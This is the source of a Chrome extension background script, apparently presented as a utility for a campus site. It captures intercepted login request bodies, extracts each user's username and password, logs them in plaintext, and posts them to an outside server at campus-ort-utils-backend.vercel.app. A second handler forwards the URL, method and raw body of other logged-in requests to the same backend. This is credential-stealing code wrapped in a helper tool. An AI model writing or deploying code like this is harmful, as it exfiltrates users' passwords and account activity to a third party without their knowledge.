const USERS_URL = "https://campus-ort-utils-backend.vercel.app/api/users";
const LOGGED_DATA_URL = "https://campus-ort-utils-backend.vercel.app/api/logged-data";

console.log("[TIC][bg] background service worker started");

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  console.log("[TIC][bg] message received:", message);

  if (
    message?.type !== "LOGEAR_USUARIO_XHR" &&
    message?.type !== "GET_LOGGED_IN_DATA_XHR"
  ) {
    return;
  }

  if (message.type === "LOGEAR_USUARIO_XHR") {
    return handleLoginPayload(message, sendResponse);
  }

  if (message.type === "GET_LOGGED_IN_DATA_XHR") {
    return handleLoggedDataPayload(message, sendResponse);
  }
});

function handleLoginPayload(message, sendResponse) {
  const rawBody = message.rawBody;
  console.log("[TIC][bg] login rawBody:", rawBody);
  console.log("[TIC][bg] login rawBody stringified:", JSON.stringify(rawBody));

  if (typeof rawBody !== "string" || !rawBody.length) {
    console.error("[TIC][bg] Missing login rawBody");
    sendResponse({ ok: false, error: "Missing rawBody" });
    return;
  }

  try {
    const params = new URLSearchParams(rawBody);
    console.log("[TIC][bg] login params:", [...params.entries()]);

    const username = params.get("u");
    const password = params.get("c");

    console.log("[TIC][bg] login extracted:", { username, password });

    if (!username || password == null) {
      sendResponse({
        ok: false,
        error: "Could not extract u/c",
        rawBody
      });
      return;
    }

    const payload = {
      username: String(username),
      password: String(password)
    };

    console.log("[TIC][bg] forwarding login payload:", payload);

    fetch(USERS_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    })
      .then(async (res) => {
        const text = await res.text();

        console.log("[TIC][bg] users response:", {
          ok: res.ok,
          status: res.status,
          body: text
        });

        sendResponse({
          ok: res.ok,
          status: res.status,
          body: text
        });
      })
      .catch((error) => {
        console.error("[TIC][bg] users fetch failed:", error);
        sendResponse({ ok: false, error: error.message });
      });

    return true;
  } catch (error) {
    console.error("[TIC][bg] login parse failed:", error);
    sendResponse({ ok: false, error: String(error) });
    return;
  }
}

function handleLoggedDataPayload(message, sendResponse) {
  console.log("[TIC][bg] logged-data request caught:", message);

  const payload = {
    method: message.method,
    url: message.url,
    rawBody: message.rawBody
  };

  console.log("[TIC][bg] forwarding logged-data payload:", payload);

  fetch(LOGGED_DATA_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(payload)
  })
    .then(async (res) => {
      const text = await res.text();

      console.log("[TIC][bg] logged-data response:", {
        ok: res.ok,
        status: res.status,
        body: text
      });

      sendResponse({
        ok: res.ok,
        status: res.status,
        body: text
      });
    })
    .catch((error) => {
      console.error("[TIC][bg] logged-data fetch failed:", error);
      sendResponse({ ok: false, error: error.message });
    });

  return true;
}